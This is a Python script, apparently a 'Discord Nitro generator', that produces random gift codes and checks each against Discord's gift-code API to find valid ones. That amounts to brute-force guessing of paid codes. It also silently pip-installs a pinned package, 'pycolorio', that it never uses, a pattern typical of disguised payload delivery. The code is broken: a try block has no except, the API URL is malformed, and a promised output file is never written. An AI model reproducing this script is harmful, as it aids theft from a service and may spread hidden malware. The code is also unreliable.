import os

def cls():
 os.system("cls")

try:
  import pycolorio
except:
  os.system("pip install pycolorio==2.2")
  import pycolorio
cls()
try:
  import requests
else:
  os.system("pip install requests")
  import requests
cls()

import ctypes
import requests
import random
import string
import time
print("""
_________ _______  _______  _______ _________ _______  _______  _       
\__   __/(  ____ )(  ___  )(  ____ )\__   __/(  ____ \(  ___  )( \      
   ) (   | (    )|| (   ) || (    )|   ) (   | (    \/| (   ) || (      
   | |   | (____)|| |   | || (____)|   | |   | |      | (___) || |      
   | |   |     __)| |   | ||  _____)   | |   | |      |  ___  || |      
   | |   | (\ (   | |   | || (         | |   | |      | (   ) || |      
   | |   | ) \ \__| (___) || )      ___) (___| (____/\| )   ( || (____/\
   )_(   |/   \__/(_______)|/       \_______/(_______/|/     \|(_______/\n
.__   __.  __  .___________..______        ______        _______  _______ .__   __.  _______ .______           ___      .___________.  ______   .______      
|  \ |  | |  | |           ||   _  \      /  __  \      /  _____||   ____||  \ |  | |   ____||   _  \         /   \     |           | /  __  \  |   _  \     
|   \|  | |  | `---|  |----`|  |_)  |    |  |  |  |    |  |  __  |  |__   |   \|  | |  |__   |  |_)  |       /  ^  \    `---|  |----`|  |  |  | |  |_)  |    
|  . `  | |  |     |  |     |      /     |  |  |  |    |  | |_ | |   __|  |  . `  | |   __|  |      /       /  /_\  \       |  |     |  |  |  | |      /     
|  |\   | |  |     |  |     |  |\  \----.|  `--'  |    |  |__| | |  |____ |  |\   | |  |____ |  |\  \----. /  _____  \      |  |     |  `--'  | |  |\  \----.
|__| \__| |__|     |__|     | _| `._____| \______/      \______| |_______||__| \__| |_______|| _| `._____|/__/     \__\     |__|      \______/  | _| `._____|
                                                                                                                                                             
""")

num = int(input('Input How Many Codes to Generate and Check: '))

with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
    print("Your nitro codes are being generated, be patient if you entered the high number!")

    start = time.time()

    for i in range(num):
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k = 16
        ))

        file.write(f"https://discord.gift/{code}\n")

    print(f"Generated {num} codes | Time taken: {time.time() - start}\n")

with open("Nitro Codes.txt") as file:
    for line in file.readlines():
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(f" Valid | {nitro} ")
            break
        else:
            print(f" Invalid | {nitro} ")

time.sleep(0.2)

input("\nYou have generated, Now press enter to close this, you'll get valid codes in Valid Codes.txt if you see its empty then you didn't get any hits!")
